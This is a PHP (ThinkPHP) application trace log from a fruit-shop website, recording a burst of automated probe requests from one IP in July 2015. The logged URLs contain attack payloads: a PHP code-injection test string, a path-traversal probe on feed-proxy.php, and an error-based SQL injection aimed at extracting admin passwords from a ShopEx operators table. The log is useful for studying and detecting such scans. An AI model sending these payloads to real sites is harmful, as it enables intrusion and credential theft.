[ 2015-07-23T10:44:32+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/index/type/bbx/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000173s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000067s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000162s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit_type` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit_type` ORDER BY `order` DESC  [ RunTime:0.0001s ]
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit` WHERE ( `order`!=0 AND  `recommend`=1   ) ORDER BY `order` DESC  [ RunTime:0.0001s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000062s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000159s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.032076s ]
INFO: [ view_parse ] --END-- [ RunTime:0.032175s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000066s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000155s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000065s ]
INFO: [ app_end ] --END-- [ RunTime:0.000153s ]

[ 2015-07-23T10:44:37+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/index/type/tools/life/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000171s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000067s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000162s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit_type` [ RunTime:0.0006s ]
SQL: SELECT * FROM `fruit_type` ORDER BY `order` DESC  [ RunTime:0.0001s ]
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit` WHERE ( `order`!=0 AND  `recommend`=1   ) ORDER BY `order` DESC  [ RunTime:0.0001s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000069s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000193s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007743s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007847s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000128s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000220s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000079s ]
INFO: [ app_end ] --END-- [ RunTime:0.000168s ]

[ 2015-07-23T10:45:25+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/bbx/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000174s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000069s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000168s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
ERR: 非法操作:bbx

[ 2015-07-23T10:45:29+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/index/type/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000080s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000195s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit_type` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit_type` ORDER BY `order` DESC  [ RunTime:0.0001s ]
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit` WHERE ( `order`!=0 AND  `recommend`=1   ) ORDER BY `order` DESC  [ RunTime:0.0001s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000064s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000160s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007101s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000066s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000153s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000065s ]
INFO: [ app_end ] --END-- [ RunTime:0.000153s ]

[ 2015-07-23T10:46:18+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/index/type//feed-proxy.php?feed=http/../feed-proxy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000173s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000069s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000165s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit_type` [ RunTime:0.0006s ]
SQL: SELECT * FROM `fruit_type` ORDER BY `order` DESC  [ RunTime:0.0001s ]
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit` WHERE ( `order`!=0 AND  `recommend`=1   ) ORDER BY `order` DESC  [ RunTime:0.0001s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000062s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000175s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007102s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000067s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000153s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000065s ]
INFO: [ app_end ] --END-- [ RunTime:0.000154s ]

[ 2015-07-23T10:46:26+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/tools/life/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000172s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000066s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000162s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
ERR: 非法操作:tools

[ 2015-07-23T10:46:29+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/index/type//shopadmin/index.php?ctl=passport&act=login&sess_id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28select+concat%28userpass%2C0x7e%2Cusername%2C0x7e%2Cop_id%29+from+sdb_operators+order+by+username+limit+0%2C1%29+%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000043s ]
INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000067s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000162s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit_type` [ RunTime:0.0006s ]
SQL: SELECT * FROM `fruit_type` ORDER BY `order` DESC  [ RunTime:0.0001s ]
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0007s ]
SQL: SELECT * FROM `fruit` WHERE ( `order`!=0 AND  `recommend`=1   ) ORDER BY `order` DESC  [ RunTime:0.0001s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000064s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000186s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007126s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007226s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000064s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000151s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000063s ]
INFO: [ app_end ] --END-- [ RunTime:0.000152s ]

[ 2015-07-23T10:47:27+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000171s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000067s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000162s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
ERR: 非法操作:yanfang

[ 2015-07-23T10:47:32+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/detail/id/bbx/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000174s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000069s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000164s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0009s ]
ERR: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'bbx' in 'where clause'

[ 2015-07-23T10:48:28+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index//feed-proxy.php?feed=http/../feed-proxy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000177s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000069s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000164s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
ERR: 非法操作:feed-proxy.php

[ 2015-07-23T10:48:33+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/detail/id/tools/life/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000172s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000068s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000164s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0009s ]
ERR: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'tools' in 'where clause'

[ 2015-07-23T10:48:42+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index//shopadmin/index.php?ctl=passport&act=login&sess_id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28select+concat%28userpass%2C0x7e%2Cusername%2C0x7e%2Cop_id%29+from+sdb_operators+order+by+username+limit+0%2C1%29+%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000171s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000073s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000168s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
ERR: 非法操作:shopadmin

[ 2015-07-23T10:48:43+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/detail/id/yanfang/index.php?q=%7B%24%7Bprint%28md5%28233333%29%29%7D%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000161s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000064s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000163s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0009s ]
ERR: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'yanfang' in 'where clause'

[ 2015-07-23T10:48:44+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/detail/id//feed-proxy.php?feed=http/../feed-proxy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000176s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000062s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000156s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0009s ]
ERR: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'feed' in 'where clause'

[ 2015-07-23T10:48:45+08:00 ] 121.42.0.18 /zhier/index.php/Fruit/Index/detail/id//shopadmin/index.php?ctl=passport&act=login&sess_id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28select+concat%28userpass%2C0x7e%2Cusername%2C0x7e%2Cop_id%29+from+sdb_operators+order+by+username+limit+0%2C1%29+%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000069s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000164s ]
NOTIC: [8] Undefined index: user /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: hasJumped /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 44 行.
NOTIC: [8] Undefined index: carnum /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 56 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 57 行.
NOTIC: [8] Undefined index: car /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
NOTIC: [2] Invalid argument supplied for foreach() /var/www/zhier/App/Fruit/Controller/IndexController.class.php 第 62 行.
SQL: SHOW COLUMNS FROM `fruit` [ RunTime:0.0010s ]
ERR: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'shopadmin' in 'where clause'

